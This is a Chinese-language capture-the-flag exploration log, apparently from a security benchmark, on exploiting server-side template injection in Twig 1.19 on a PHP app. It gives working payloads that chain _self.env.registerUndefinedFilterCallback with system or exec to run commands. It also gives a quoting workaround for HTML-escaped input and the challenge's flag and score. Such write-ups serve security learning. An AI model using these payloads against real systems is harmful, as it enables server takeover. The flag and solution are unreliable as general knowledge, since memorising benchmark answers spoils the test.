# xben-044-24 · 探索记录

对应题解：[`xben-044-24.md`](./xben-044-24.md)

## 目标与起点

容器 `10.0.173.136:8080`，`Apache/2.4.56` + `X-Powered-By: PHP/8.0.30`。
标题 `Submit a username`，一个 `name` 字段，POST 回自身。

## 第一阶段：提交后看回显

```bash
curl --data-urlencode "name=test" http://$T/
```

```html
<strong>test is in stock! Come back and test another one. </strong>
<br/>Twig version: 1.19.0
<br/>Loaded extension: core, escaper, optimizer
```

**判据**：回显里直接印着 `Twig version: 1.19.0`，且 `name` 被拼进输出
→ 高度怀疑模板注入。

## 第二阶段：确认 SSTI

| 输入 | 回显 |
| --- | --- |
| `{{7*7}}` | `49 is in stock!` ← **确认** |
| `{{_self}}` | Fatal error：`Object of class __TwigTemplate_… could not be converted to string` |
| `{{dump()}}` | `The function "dump" does not exist` |

`{{_self}}` 的报错暴露了模板类名与 Twig 内部实现，进一步确认是 Twig 1.x。

## 第三阶段：双引号被转义

```bash
name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

```text
Twig_Error_Syntax: Unexpected character "&" in "…&quot;exec&quot;…"
```

**判据**：`name` 在进模板前已经被 HTML 转义，`"` → `&quot;`。
改用单引号：

```bash
name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

```html
<strong>uid=33(www-data) gid=33(www-data) groups=33(www-data) is in stock!</strong>
```

RCE 成功。

## 第四阶段：读 flag

```bash
name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('ls /; cat /flag.txt')}}
```

```text
bin boot dev etc flag.txt home …
flag{c9ebaddf-702a-47da-9ab3-9906afe658fe}
```

`/flag.txt`（小写）在根目录。提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `{{7*"7"}}` | Twig 语法错误 | `"` 被转义成 `&quot;`，模板看到 `&` |
| `{{_self.env.registerUndefinedFilterCallback("exec")}}` | 同样语法错误 | 同上，必须用单引号 |
| `{{dump()}}` | 函数不存在 | 没有启用 debug 扩展 |
| `{{_self}}` | 类型转换错误 | 但泄露了模板类名，可用于确认引擎 |

## 这次真正的收获

1. **回显里的版本号是最强的线索。** `Twig version: 1.19.0` 直接把攻击面定死；
   没有这行的话，`{{7*7}}=49` 只能说明是模板引擎（Twig/Jinja2 都可能）。
2. **`{{7*7}}` 作为最小探针**：一次请求就能区分「字符串拼接」和「模板求值」。
3. **输入编码层会改变 payload。** 本题 `name` 先 HTML 转义再渲染，
   双引号变成 `&quot;`；看到 `Unexpected character "&"` 就应该换成单引号字符串。
4. **Twig 1.x 的 `_self.env` 链**：
   `registerUndefinedFilterCallback('system')` + `getFilter('cmd')`，
   比找 `_self.env.getGlobals()` 之类的写法更短，也不依赖 sandbox 关闭。
5. **RCE 回显直接可见**，不需要反弹 shell 或写文件外带——这是本题最省力的地方。
